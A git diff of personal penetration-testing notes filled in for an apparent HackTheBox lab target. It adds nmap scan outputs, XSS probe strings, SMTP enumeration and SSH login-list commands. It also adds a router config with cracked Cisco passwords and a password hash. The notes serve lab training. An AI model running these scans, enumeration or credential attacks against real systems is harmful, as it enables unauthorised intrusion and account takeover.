@@ -4,8 +4,8 @@ What is my local host ip address *localhost*
 
 Info- Sheet
 
-+ IP address: *target*
-+ DNS-Domain name: *target-domain*
++ IP address: 10.10.10.149
++ DNS-Domain name: http://10.10.10.149/
 + Host name: *host-name*
 + OS: *os*
 + Web Server (web server name): *web-server*
@@ -38,9 +38,9 @@ INSERTTCPSCAN
 ```
 Esc + F Find and replace on anything that has stars from above *find and replace me*. 
 
-Find&replace *target* with the target IP address  //DONE
+Find&replace 10.10.10.149 with the target IP address  //DONE
 
-find&replace *target-domain* with http://*ipaddress or domain name*/ name  //DONE
+find&replace http://10.10.10.149/ with http://*ipaddress or domain name*/ name  //DONE
 
 find&replace *localhost* with localhost ip address
 
@@ -128,68 +128,39 @@ Msf> services
 
 Msf > search services
 
-### Start any custom password sniffing tools
+```
+msf5 > services
+Services
+========
 
-Start metasploit smb password sniffer
+host          port   proto  name           state     info
+----          ----   -----  ----           -----     ----
+10.10.10.149  21     tcp    ftp            filtered  
+10.10.10.149  22     tcp    ssh            filtered  
+10.10.10.149  23     tcp    telnet         filtered  
+10.10.10.149  25     tcp    smtp           filtered  
+10.10.10.149  53     tcp    domain         filtered  
+10.10.10.149  80     tcp    http           open      Microsoft IIS httpd 10.0
+10.10.10.149  110    tcp    pop3           filtered  
+10.10.10.149  111    tcp    rpcbind        filtered  
+10.10.10.149  135    tcp    msrpc          open      Microsoft Windows RPC
+10.10.10.149  139    tcp    netbios-ssn    filtered  
+10.10.10.149  143    tcp    imap           filtered  
+10.10.10.149  443    tcp    https          filtered  
+10.10.10.149  445    tcp    microsoft-ds   open      
+10.10.10.149  993    tcp    imaps          filtered  
+10.10.10.149  995    tcp    pop3s          filtered  
+10.10.10.149  1723   tcp    pptp           filtered  
+10.10.10.149  3306   tcp    mysql          filtered  
+10.10.10.149  3389   tcp    ms-wbt-server  filtered  
+10.10.10.149  5900   tcp    vnc            filtered  
+10.10.10.149  5985   tcp    wsman          open      Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
+10.10.10.149  8080   tcp    http-proxy     filtered  
+10.10.10.149  49668  tcp    msrpc          open      Microsoft Windows RPC
 
-Use auxillery/sniffer/psnuffle
 
 
-### Recon
-
-
-If this default attack plan fails you then go to the PWK Workbook and navigate to the “tips for pwk” tab. Then review scripts and links and try harder!
-
-#### My Backup attack plan if all else fails
-
-If this doesn’t work then get back to basics and break out the books. First go to your google drive and look into the books one 
-by one starting with
-
-•	Open up your saved pcap file inside “network miner”
-
-•	If you got here then run the "sniper pentesting tool"
-
-•	https://github.com/1N3/Sn1per
-
-•	https://www.darknet.org.uk/2017/05/sn1per-penetration-testing-automation-scanner/
-
-•	Upload danderspritz and fuzzbunch to win7 host
-
-•	Review both metasploitable 1 and 2 hacking guides
-
-•	Web app pen testing
-
-•	ftp pen testing
-
-•	sql
-
-•	Open up your kindle and review books one by one
-
-•	review your hacking with metasploit reference guide
-
-•	review your python for penetration guide
-
-•	hacking tutorials folder (google drive)
-
-•	Effective python for pentration testing
-
-•	Go to the local book shelf and review books
-
-•	Review 560 sample pentesting report
-
-•	Review pwk how to pentest guide and videos
-
-•	Scanners (googledrive)
-
-•	Mytechnotes
-
-•	Bruteforce
-
-•	GO here
-
-o	https://crowdshield.com/blog.php?name=pwning-windows-domains-from-the-command-line
-
-Then if that fails open the windows default attack plan and the linux default attack plan.
+```
 
 
 ### START ATTACK PLAN
@@ -228,15 +199,29 @@ Make a list of targets from the list of targets provided. Call the list "Livehos
 
 Do a synscan for the top 100 ports and then do a synscan for all ports
 
-nmap -sS  --top-ports 100 --open *target*
+nmap -sS  --top-ports 100 --open 10.10.10.149
 
-nmap -sS  --top-ports 100 -iL LiveHosts.txt
+```
+root@kali-1:~/hackthebox# nmap -sS --top-ports 100 --open 10.10.10.149
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-29 15:04 EST
+Nmap scan report for 10.10.10.149
+Host is up (0.091s latency).
+Not shown: 97 filtered ports
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT    STATE SERVICE
+80/tcp  open  http
+135/tcp open  msrpc
+445/tcp open  microsoft-ds
+
+Nmap done: 1 IP address (1 host up) scanned in 4.66 seconds
+
+```
 
 ### Syn-Scan all ports and output to xml format
 
-nmap -sS -p- *target* -oX synscan1.xml
+nmap -sS -p- 10.10.10.149 -oX synscan1.xml
 
-nmap -sS --open *target* -oX synscan2-open.xml {Just open connections - nice clean output}
+nmap -sS --open 10.10.10.149 -oX synscan2-open.xml {Just open connections - nice clean output}
 
 ```
 Insert Scan
@@ -247,14 +232,26 @@ Insert Scan
 
 Do a service and OS scan for the top 20 ports
 
-nmap *target* -sV -O -top-ports=20 -oX service_scan1.xml
+nmap 10.10.10.149 -sV -O -top-ports=20 -oX service_scan1.xml
 
-nmap -sV --version-intensity 5 *target*
+nmap -sV --version-intensity 5 10.10.10.149
 
-nmap -sSV --stats-every 5 *target*
+nmap -sSV --stats-every 5 10.10.10.149
 
 ```
-Insert Scan
+root@kali-1:~/hackthebox# nmap -sS -p- 10.10.10.149 -oX synscan1.xml
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-29 15:05 EST
+Nmap scan report for 10.10.10.149
+Host is up (0.017s latency).
+Not shown: 65530 filtered ports
+PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+445/tcp   open  microsoft-ds
+5985/tcp  open  wsman
+49668/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 363.94 seconds
 
 ```
 
@@ -262,42 +259,59 @@ Insert Scan
 
 Do a full scan of all ports
 
-nmap -sV -O -p- *target* -oX all_ports_service_scan1.xml
+nmap -sV -O -p- 10.10.10.149 -oX all_ports_service_scan1.xml
 
-nmap *target* -p- -T4 -A -PN -oX full_agressive-scan1.xml
-
-```
-Insert Scan
+nmap 10.10.10.149 -p- -T4 -A -PN -oX full_agressive-scan1.xml
 
 ```
-### Port knocking with hping
+root@kali-1:~/hackthebox# nmap 10.10.10.149 -p- -T4 -A -PN -oX full_agressive-scan1.xml
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-29 15:08 EST
+Nmap scan report for 10.10.10.149
+Host is up (0.017s latency).
+Not shown: 65530 filtered ports
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Support Login Page
+|_Requested resource was login.php
+135/tcp   open  msrpc         Microsoft Windows RPC
+445/tcp   open  microsoft-ds?
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49668/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
-What we are doing here, is using the hping3 command, pointing it at our IP address, then specifying a port number (e.g -p 1) then how many “pings” to send (in this case just the one e.g -c 1)
+Host script results:
+|_clock-skew: mean: 6h20m33s, deviation: 0s, median: 6h20m33s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-11-29 21:34:04
+|_  start_date: N/A
 
-Do this for each port 1, 2 and 3, and now lets perform another NMAP scan, see what turns up!
+TRACEROUTE (using port 445/tcp)
+HOP RTT      ADDRESS
+1   16.75 ms 10.10.14.1
+2   16.84 ms 10.10.10.149
 
-Only if you get a hint of port knocking first try
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 353.20 seconds
+
 
 ```
-knock 192.168.57.102 1 2 3
-```
-then try 
-```
-#!/bin/sh
 
-echo -n "*" | nc -q1 -u *target-domain* 12345
-echo -n "*" | nc -q1 -u *target-domain* 23456
-echo -n "*" | nc -q1 -u *target-domain* 34567
-ssh www.example.com
-
-#!/bin/sh
-
-hping3 *target* --udp -c 1 -p 12345
-hping3 *target* --udp -c 1 -p 23456
-hping3 *target* --udp -c 1 -p 34567
-ssh root@*target*
-
-```
 
 ### nmap script shortcut
 
@@ -321,75 +335,236 @@ the flag --script-args is used to set arguments of nse scripts
 
 ### nmap script example for discovery
 
-nmap --script default *target*
-
-nmap --script discovery *target*
-
-
-### recon: In a big network first get a good list of Live hosts, 
-
-
--T*0-5*: Set timing template (higher is faster)
-
--sn: Ping Scan - disable port scan
-
-1. nmap -sn -T4 -oG Discovery.gnmap *target*/24 > live_hosts_list
-
-2. grep "Status: Up" Discovery.gnmap | cut -f 2 -d ' ' > LiveHosts.txt
-
-3. nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt
-
-4. Or ping the subnet and handbomb a LiveHosts list. 
-
-
-
-### Start the p0f tool and try to passively fingerprint hosts
-
-http://lcamtuf.coredump.cx/p0f3/
-
-
-Read the fingerprint database from p0f.fp and output to p0f.log
+nmap --script default 10.10.10.149
 
 ```
-p0f -I tap0 -p -f /etc/p0f/p0f.fp -o p0f.log
+root@kali-1:~/hackthebox# nmap --script default 10.10.10.149
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-29 15:14 EST
+Nmap scan report for 10.10.10.149
+Host is up (0.017s latency).
+Not shown: 997 filtered ports
+PORT    STATE SERVICE
+80/tcp  open  http
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| http-title: Support Login Page
+|_Requested resource was login.php
+135/tcp open  msrpc
+445/tcp open  microsoft-ds
 
--p is promisc mode
+Host script results:
+|_clock-skew: mean: 6h20m33s, deviation: 0s, median: 6h20m33s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-11-29 21:35:19
+|_  start_date: N/A
+
+Nmap done: 1 IP address (1 host up) scanned in 44.91 seconds
 
 
 ```
 
-### IDENTIFY THE NETWORK INFRASTRUCTURE
-
-
-•	Enumerate hosts
-
-•	Finger Print Operating systems
-
-•	Nmap -sS -O *target*
-
-•	Make directory structure ~/exam_pwk/hosts
-
-Choose last octets of ip address for dirs
-
-
-### SCAN.SH from GL
-
-Scan for vulns with ./scan.sh *ip address* vuln --force
-
-scan.sh *target* vuln --force
+nmap --script discovery 10.10.10.149
 
 ```
-Insert Scan
+Nmap scan report for 10.10.10.149
+Host is up (0.043s latency).
+Not shown: 997 filtered ports
+PORT    STATE SERVICE
+80/tcp  open  http
+| http-auth-finder: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.149
+|   url                                          method
+|   http://10.10.10.149:80/                      FORM
+|   http://10.10.10.149:80/login.php             FORM
+|_  http://10.10.10.149:80/login.php?guest=true  FORM
+|_http-chrono: Request times for /; avg: 712.77ms; min: 280.12ms; max: 1076.12ms
+| http-comments-displayer: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.149
+|     
+|     Path: http://10.10.10.149:80/css/style.css
+|     Line number: 160
+|     Comment: 
+|         /*   background: cornflowerblue; */
+|     
+|     Path: http://10.10.10.149:80/css/style.css
+|     Line number: 36
+|     Comment: 
+|         /******* Login Page *******/
+|     
+|     Path: http://10.10.10.149:80/js/index.js
+|     Line number: 1
+|     Comment: 
+|         /* ---- particles.js config ---- */
+|     
+|     Path: http://10.10.10.149:80/js/index.js
+|     Line number: 76
+|     Comment: 
+|_        /* ---- stats.js config ---- */
+|_http-date: Sat, 30 Nov 2019 02:38:18 GMT; +6h20m33s from local time.
+|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
+| http-enum: 
+|_  /login.php: Possible admin folder
+|_http-errors: Couldn't find any error pages.
+|_http-feed: Couldn't find any feeds.
+| http-headers: 
+|   Cache-Control: no-store, no-cache, must-revalidate
+|   Pragma: no-cache
+|   Content-Length: 0
+|   Content-Type: text/html; charset=UTF-8
+|   Expires: Thu, 19 Nov 1981 08:52:00 GMT
+|   Server: Microsoft-IIS/10.0
+|   X-Powered-By: PHP/7.3.1
+|   Set-Cookie: PHPSESSID=hccf12a7q1m3eml5gi05cant8o; path=/
+|   Date: Sat, 30 Nov 2019 02:38:21 GMT
+|   Connection: close
+|   
+|_  (Request type: HEAD)
+|_http-mobileversion-checker: No mobile version detected.
+|_http-php-version: Version from header x-powered-by: PHP/7.3.1
+| http-referer-checker: 
+| Spidering limited to: maxpagecount=30
+|   https://cdnjs.cloudflare.com:443/ajax/libs/jquery/3.1.1/jquery.min.js
+|_  https://cdn.jsdelivr.net:443/particles.js/2.0.0/particles.min.js
+| http-security-headers: 
+|   Cache_Control: 
+|     Header: Cache-Control: no-store, no-cache, must-revalidate
+|   Pragma: 
+|     Header: Pragma: no-cache
+|   Expires: 
+|_    Header: Expires: Thu, 19 Nov 1981 08:52:00 GMT
+| http-sitemap-generator: 
+|   Directory structure:
+|     /
+|       Other: 1; php: 1
+|     /css/
+|       css: 1
+|     /js/
+|       js: 1
+|   Longest directory structure:
+|     Depth: 1
+|     Dir: /css/
+|   Total files found (by extension):
+|_    Other: 1; css: 1; js: 1; php: 1
+| http-title: Support Login Page
+|_Requested resource was login.php
+| http-useragent-tester: 
+|   Status for browser useragent: 200
+|   Redirected To: login.php
+|   Allowed User Agents: 
+|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+|     libwww
+|     lwp-trivial
+|     libcurl-agent/1.0
+|     PHP/
+|     Python-urllib/2.5
+|     GT::WWW
+|     Snoopy
+|     MFC_Tear_Sample
+|     HTTP::Lite
+|     PHPCrawl
+|     URI::Fetch
+|     Zend_Http_Client
+|     http client
+|     PECL::HTTP
+|     Wget/1.13.4 (linux-gnu)
+|_    WWW-Mechanize/1.34
+| http-vhosts: 
+|_127 names had status 302
+| http-waf-detect: IDS/IPS/WAF detected:
+|_10.10.10.149:80/?p4yl04d3=<script>alert(document.cookie)</script>
+|_http-xssed: No previously reported XSS vuln.
+135/tcp open  msrpc
+445/tcp open  microsoft-ds
+|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
+
+Host script results:
+|_dns-brute: Can't guess domain of "10.10.10.149"; use dns-brute.domain script argument.
+|_fcrdns: FAIL (No PTR record)
+|_ipidseq: Random Positive Increments
+|_msrpc-enum: Could not negotiate a connection:SMB: ERROR: Server disconnected the connection
+|_path-mtu: PMTU == 1500
+| qscan: 
+| PORT  FAMILY  MEAN (us)  STDDEV    LOSS (%)
+| 80    0       16906.89   107.90    10.0%
+| 135   0       26613.80   28398.55  0.0%
+|_445   0       17519.00   1208.73   0.0%
+| smb-mbenum: 
+|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: ERROR: Server disconnected the connection
+| smb-protocols: 
+|   dialects: 
+|     2.02
+|     2.10
+|     3.00
+|     3.02
+|_    3.11
+| smb2-capabilities: 
+|   2.02: 
+|     Distributed File System
+|   2.10: 
+|     Distributed File System
+|     Leasing
+|     Multi-credit operations
+|   3.00: 
+|     Distributed File System
+|     Leasing
+|     Multi-credit operations
+|   3.02: 
+|     Distributed File System
+|     Leasing
+|     Multi-credit operations
+|   3.11: 
+|     Distributed File System
+|     Leasing
+|_    Multi-credit operations
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-11-29 21:38:34
+|_  start_date: N/A
+
+Nmap done: 1 IP address (1 host up) scanned in 97.89 seconds
 
 ```
+
+### Connected to the following link and found a router config file
+
+
+
+http://10.10.10.149:80/login.php?guest=true
+
+cracked the cisco lvl 7 password
+
+http://www.ifm.net.nz/cookbooks/passwordcracker.html
+
+security passwords min-length 12
+enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
+
+username rout3r password 7 0242114B0E143F015F5D1E161713
+
+$uperP@ssword
+
+username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
+Q4)sJu\Y8qz*A3?d
+
+
+
+
 
 ### TCP connect scan
 
-nc -nvv -w 1 -z *target* 3388-3390
+nc -nvv -w 1 -z 10.10.10.149 3388-3390
 
 ### Nmap Broadcast scan
 
-nmap --script=broadcast --script-args=*target*/24
+nmap --script=broadcast --script-args=10.10.10.149/24
 
 ### Nmap scan for backdoors
 
@@ -409,15 +584,35 @@ T: = tcp
 
 nmap INSERTIPADDRESS -sU
 
-nmap -v -sU -sT -p U:53,69,111,137,T:21-25,80,139,8080,T:160-162 *target*
+nmap -v -sU -sT -p U:53,69,111,137,T:21-25,80,139,8080,T:160-162 10.10.10.149
+
+```
+PORT     STATE         SERVICE
+21/tcp   filtered      ftp
+22/tcp   filtered      ssh
+23/tcp   filtered      telnet
+24/tcp   filtered      priv-mail
+25/tcp   filtered      smtp
+80/tcp   open          http
+139/tcp  filtered      netbios-ssn
+160/tcp  filtered      sgmp-traps
+161/tcp  filtered      snmp
+162/tcp  filtered      snmptrap
+8080/tcp filtered      http-proxy
+53/udp   open|filtered domain
+69/udp   open|filtered tftp
+111/udp  open|filtered rpcbind
+137/udp  open|filtered netbios-ns
+
+```
 
 ### Scan for UDP with SERVICE
 
-nmap -v -sV -sU -sT -p U:53,69,111,137,T:21-25,80,139,8080,T:160-162 *target*
+nmap -v -sV -sU -sT -p U:53,69,111,137,T:21-25,80,139,8080,T:160-162 10.10.10.149
 
-nmap -sU -p- *target*
+nmap -sU -p- 10.10.10.149
 
-nc -nv -u -z -w 1 *target* 160-162  > look within wireshark for OPEN ports
+nc -nv -u -z -w 1 10.10.10.149 160-162  > look within wireshark for OPEN ports
 
 ```
 
@@ -427,32 +622,32 @@ Insert Scan
 
 ### UnicornScan
 
-unicornscan -mU -v -I *target*
+unicornscan -mU -v -I 10.10.10.149
 
-us -H -msf -Iv *target* -p 1-65535 
+us -H -msf -Iv 10.10.10.149 -p 1-65535 
 
-us -H -mU -Iv *target* -p 1-65535
+us -H -mU -Iv 10.10.10.149 -p 1-65535
 
 ```
 •	-H resolve hostnames during the reporting phase 
 •	-m scan mode (sf - tcp, U - udp)
 •	-Iv - verbose
 ```
-us -H -msf -Iv *target* -p 1-65535  > us_10_11_1_5
+us -H -msf -Iv 10.10.10.149 -p 1-65535  > us_10_11_1_5
 
-us -mU -r200 -I *target* -p 1-65535  > us_10_11_1_5_udp
+us -mU -r200 -I 10.10.10.149 -p 1-65535  > us_10_11_1_5_udp
 
 ### Connect to udp if one is open
 
-nc -u *target* 48772
+nc -u 10.10.10.149 48772
 
 ### Monster scan
 
-nmap *target* -p- -A -T4 -sC
+nmap 10.10.10.149 -p- -A -T4 -sC
 
 ### mass scan
 
-masscan -p 0-65535 *target* --rate=500
+masscan -p 0-65535 10.10.10.149 --rate=500
 
 ### NDiff for nmap
 
@@ -490,20 +685,135 @@ Root> xsltproc results.xml -o results.html
 
 ### Example nmap vulns unsafe html report
 
-nmap -v --top-ports=20 --script=vuln script-args=unsafe *target* -oX vulns-results.xml
+nmap -v --top-ports=20 --script=vuln script-args=unsafe 10.10.10.149 -oX vulns-results.xml
 
 xsltproc vulns-results.xml -o results.html
+
+
+root@kali-1:~/hackthebox# nmap -v --top-ports=20 --script=vuln script-args=unsafe 10.10.10.149 -oX vulns-results.xml
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-29 15:43 EST
+NSE: Loaded 103 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 15:43
+NSE Timing: About 50.00% done; ETC: 15:44 (0:00:31 remaining)
+Completed NSE at 15:43, 34.00s elapsed
+Initiating NSE at 15:43
+Completed NSE at 15:43, 0.00s elapsed
+Pre-scan script results:
+| broadcast-avahi-dos: 
+|   Discovered hosts:
+|     224.0.0.251
+|   After NULL UDP avahi packet DoS (CVE-2011-1002).
+|_  Hosts are all up (not vulnerable).
+Failed to resolve "script-args=unsafe".
+Initiating Ping Scan at 15:43
+Scanning 10.10.10.149 [4 ports]
+Completed Ping Scan at 15:43, 0.05s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 15:43
+Completed Parallel DNS resolution of 1 host. at 15:43, 0.00s elapsed
+Initiating SYN Stealth Scan at 15:43
+Scanning 10.10.10.149 [20 ports]
+Discovered open port 445/tcp on 10.10.10.149
+Discovered open port 80/tcp on 10.10.10.149
+Discovered open port 135/tcp on 10.10.10.149
+Completed SYN Stealth Scan at 15:43, 1.44s elapsed (20 total ports)
+NSE: Script scanning 10.10.10.149.
+Initiating NSE at 15:43
+Completed NSE at 15:46, 139.63s elapsed
+Initiating NSE at 15:46
+Completed NSE at 15:46, 0.00s elapsed
+Nmap scan report for 10.10.10.149
+Host is up (0.017s latency).
+
+PORT     STATE    SERVICE
+21/tcp   filtered ftp
+22/tcp   filtered ssh
+23/tcp   filtered telnet
+25/tcp   filtered smtp
+53/tcp   filtered domain
+80/tcp   open     http
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|       httponly flag not set
+|   /login.php: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-csrf: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.149
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://10.10.10.149:80/
+|     Form id: login_username
+|     Form action: /login.php
+|     
+|     Path: http://10.10.10.149:80/login.php?guest=true
+|     Form id: login_username
+|     Form action: /login.php
+|     
+|     Path: http://10.10.10.149:80/login.php
+|     Form id: login_username
+|_    Form action: /login.php
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|_  /login.php: Possible admin folder
+| http-phpself-xss: 
+|   VULNERABLE:
+|   Unsafe use of $_SERVER["PHP_SELF"] in PHP files
+|     State: VULNERABLE (Exploitable)
+|       PHP files are not handling safely the variable $_SERVER["PHP_SELF"] causing Reflected Cross Site Scripting vulnerabilities.
+|              
+|     Extra information:
+|       
+|   Vulnerable files with proof of concept:
+|     http://10.10.10.149/login.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
+|   Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.149
+|     References:
+|       https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+|_      http://php.net/manual/en/reserved.variables.server.php
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+110/tcp  filtered pop3
+111/tcp  filtered rpcbind
+135/tcp  open     msrpc
+139/tcp  filtered netbios-ssn
+143/tcp  filtered imap
+443/tcp  filtered https
+445/tcp  open     microsoft-ds
+993/tcp  filtered imaps
+995/tcp  filtered pop3s
+1723/tcp filtered pptp
+3306/tcp filtered mysql
+3389/tcp filtered ms-wbt-server
+5900/tcp filtered vnc
+8080/tcp filtered http-proxy
+
+Host script results:
+|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server disconnected the connection
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server disconnected the connection
+
+NSE: Script Post-scanning.
+Initiating NSE at 15:46
+Completed NSE at 15:46, 0.00s elapsed
+Initiating NSE at 15:46
+Completed NSE at 15:46, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 176.99 seconds
+           Raw packets sent: 41 (1.780KB) | Rcvd: 4 (160B)
+
+
+
 
 ### Map the route to host 
 
 ### Get network routing information
 
 
-tcptraceroute *target* or *target-domain*
+tcptraceroute 10.10.10.149 or http://10.10.10.149/
 
-tctrace -I tap0 -d *target-domain*
+tctrace -I tap0 -d http://10.10.10.149/
 
-ping *target*
+ping 10.10.10.149
 
 #### ping command for ipv6
 
@@ -512,33 +822,36 @@ ping6
 
 ### arping
 
-arping *target* -c 1
+arping 10.10.10.149 -c 1
 
+root@kali-1:~/hackthebox# arping 10.10.10.149 -c 1
+arping: lookup dev: No matching interface found using getifaddrs().
+arping: Unable to automatically find interface to use. Is it on the local LAN?
+arping: Use -i to manually specify interface. Guessing interface eth0.
+ARPING 10.10.10.149
+Timeout
 
-### DEEPMAGIC INFORMATION GATHERING TOOL
+--- 10.10.10.149 statistics ---
+1 packets transmitted, 0 packets received, 100% unanswered (0 extra)
 
-use with external ip or domain names
-
-dmitry -iwnse *target*or*target-domain*
-
-use with internal ip ranges
-
-dmitry -p *target* -f -b
-
-```
-
-Insert Scan
-
-```
 
 
 ### banner grabbing
 
-nmap -sV -sT *target*
+nmap -sV -sT 10.10.10.149
 
 ```
 
-Insert Scan
+root@kali-1:~/hackthebox# nmap -sV -sT 10.10.10.149
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-29 15:51 EST
+Nmap scan report for 10.10.10.149
+Host is up (0.017s latency).
+Not shown: 997 filtered ports
+PORT    STATE SERVICE       VERSION
+80/tcp  open  http          Microsoft IIS httpd 10.0
+135/tcp open  msrpc         Microsoft Windows RPC
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:window
 
 ```
 
@@ -550,7 +863,7 @@ ls -lh /usr/share/nmap/scripts/*smb*
 
 ### NBTSCAN
 
-Nbtscan -r *target*/24
+Nbtscan -r 10.10.10.149/24
 
 ### Port 21 - FTP
 
@@ -574,9 +887,9 @@ INSERTFTPTEST
 
 Open up web browser and browse to
 
-ftp://*target*
+ftp://10.10.10.149
 
-nmap -v -p 21 --script=ftp-anon.nse *target*-254
+nmap -v -p 21 --script=ftp-anon.nse 10.10.10.149-254
 
 ```
 
@@ -584,7 +897,7 @@ insert scan
 
 ```
 
-nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 *target*
+nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.10.10.149
 
 
 ```
@@ -610,11 +923,11 @@ Insert Scan
 ```
 #### Curl the FTP site
 
-curl ftp://user:pass@*target*/directory
+curl ftp://user:pass@10.10.10.149/directory
 
 #### browse to the ftp site and see if you can upload stuff
 
-#### python ftpanon.py *target*/24
+#### python ftpanon.py 10.10.10.149/24
 
 ```
 
@@ -672,7 +985,7 @@ MSF anaonymous login scan
 
 If you have usernames test login with Then look for errors. 
 
-ssh username@*target*
+ssh username@10.10.10.149
 
 look at error codes all the time
 
@@ -681,17 +994,17 @@ ssh -vv
 
 non standard ports
 
-ssh -vv -p 210 root@*target*
+ssh -vv -p 210 root@10.10.10.149
 
 you could try to connect using lists
 
-ssh -L users.txt -P passwords.txt -s 22 *target*
+ssh -L users.txt -P passwords.txt -s 22 10.10.10.149
 
 ```
 Insert Scan
 
 ```
-nc *target* 22
+nc 10.10.10.149 22
 
 ```
 Insert Scan
@@ -718,7 +1031,7 @@ insert key
 ### SSH automated banner grabbing
 
 ```
-root@kali:~# nmap *target* -p 22 -sV --script=ssh-hostkey
+root@kali:~# nmap 10.10.10.149 -p 22 -sV --script=ssh-hostkey
 ...SNIP...
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
@@ -790,14 +1103,14 @@ https://pen-testing.sans.org/resources/papers/gcih/smtp-victim-good-time-105208
 
 ```
 
-nc -nvv *target* 25
+nc -nvv 10.10.10.149 25
 HELO foo<cr><lf>
 INSERTSMTPCONNECT
 ```
 
 #### Telnet SMTP
 
-- telnet *target* 25
+- telnet 10.10.10.149 25
 
 - VRFY root
 
@@ -806,7 +1119,7 @@ Is Port 25 open
 
 Fingerprint server 
 
-1. telnet *target* 25 (banner grab) 
+1. telnet 10.10.10.149 25 (banner grab) 
 
 2. VRFY root
 
@@ -818,7 +1131,7 @@ Is Port 25 open
 
 Fingerprint server 
 
-1. telnet *target* 25 (banner grab) 
+1. telnet 10.10.10.149 25 (banner grab) 
 
 2. EXPN root
 
@@ -830,7 +1143,7 @@ Is Port 25 open
 
 Fingerprint server 
 
-1. telnet *target* 25 (banner grab) 
+1. telnet 10.10.10.149 25 (banner grab) 
 
 2. RCPT root
 
@@ -871,11 +1184,11 @@ Fingerprint server
 
 #### Enumerate users
 
-smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t *target*
+smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 10.10.10.149
 
-smtp-user-enum.pl -M EXPN -U users.txt -t *target*
+smtp-user-enum.pl -M EXPN -U users.txt -t 10.10.10.149
 
-smtp-user-enum.pl -M RCPT -U users.txt -t *target*
+smtp-user-enum.pl -M RCPT -U users.txt -t 10.10.10.149
 
 ```
 insert users
@@ -899,9 +1212,9 @@ Usage:
 
 finger against the users
 
-finger strange@*target*
+finger strange@10.10.10.149
  
-finger user@*target*
+finger user@10.10.10.149
 
 example insert finger outbut below
 ```
@@ -919,9 +1232,9 @@ No Plan.
 locate nse |grep smtp
 
 ```
-nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 *target*
+nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.10.10.149
 
-nmap -script=/usr/share/nmap/scripts/smtp-enum-users.nse -p25 *target*
+nmap -script=/usr/share/nmap/scripts/smtp-enum-users.nse -p25 10.10.10.149
 
 ```
 
@@ -967,7 +1280,7 @@ insert smtp scan here
 
 ./smtp-user-enum -h
 
